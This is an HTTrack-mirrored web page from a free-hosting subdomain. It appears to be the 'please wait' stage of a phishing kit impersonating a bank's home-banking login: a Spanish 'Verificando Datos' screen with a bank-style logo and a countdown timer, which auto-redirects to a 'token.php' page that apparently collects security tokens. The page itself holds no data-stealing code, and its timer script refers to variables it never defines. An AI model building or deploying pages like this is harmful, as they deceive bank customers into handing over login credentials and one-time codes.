


?>
<!DOCTYPE html>
<html><!-- Mirrored from c1621787.ferozo.com/cargando.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Dec 2022 00:36:47 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html; charset=UTF-8"><!-- /Added by HTTrack -->

  <link rel="icon" href="https://c1621787.ferozo.com/principal/images/favicon.png">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="refresh" content="23; url = token.php">
  <title>Cargando</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="main/espere.css" rel="stylesheet">

  <style>
    .timer-desktop[eyezx] {
      background-color: #fff;
    }

    #wrapper[eyezx] {
      position: absolute;
      top: 0px;
      min-height: 100%;
      width: 100%;
      overflow: hidden;
    }

    .text1[eyezx] {
      font-family: Arial;
      font-size: 24px;
      font-weight: bold;
      font-style: normal;
      font-stretch: normal;
      letter-spacing: normal;
      text-align: center;
      color: #000000;
    }

    .text2[eyezx] {
      font-family: Arial;
      font-size: 24px;
      font-weight: normal;
      font-style: normal;
      font-stretch: normal;
      letter-spacing: normal;
      text-align: center;
      color: #000000;
    }

    .logo[eyezx] {
      margin-top: 120px;
    }

    @media (max-width: 767px) {
      .logo[eyezx] {
        margin-top: 40px;
      }
    }


    .text-center {
      text-align: center !important
    }

    @media (min-width:576px) {
      .text-sm-left {
        text-align: left !important
      }
    }

    body {
      margin: 0;
    }
  </style>
</head>

<body>


  <nhbk-login>
    <div eyezx="" class="timer-desktop" id="wrapper">
      <div eyezx="">
        <div eyezx="" class="text-center">
          <img eyezx="" class="  logo" src="main/ciudad.png" width="245px">
        </div>
        <br>
        <div id="app"></div><br>

        <div eyezx="" class="text-center">
          <h2 eyezx="" class=" text1">Verificando Datos</h2>
        </div>
        <div eyezx="" class="text-center">
          <h3 eyezx="" class="text2" style="margin-top: 27px;">Espera un momento, no cierres esta ventana.</h3>
        </div>
        <div eyezx="" class="text-center" style="margin-top: 20px;">
        </div>
      </div>
    </div>

  </nhbk-login>

<script>
  document.getElementById("app").innerHTML = `
<center>
<div class="base-timer">
  <svg class="base-timer__svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <g class="base-timer__circle">
      <circle class="base-timer__path-elapsed" cx="50" cy="50" r="45"></circle>
      <path
        id="base-timer-path-remaining"
        stroke-dasharray="283"
        class="base-timer__path-remaining ${remainingPathColor}"
        d="
          M 50, 50
          m -45, 0
          a 45,45 0 1,0 90,0
          a 45,45 0 1,0 -90,0
        "
      ></path>
    </g>
  </svg>
  <span id="base-timer-label" class="base-timer__label">${formatTime(
    timeLeft
  )}</span>
</div></center>
`;
</script>



</body></html>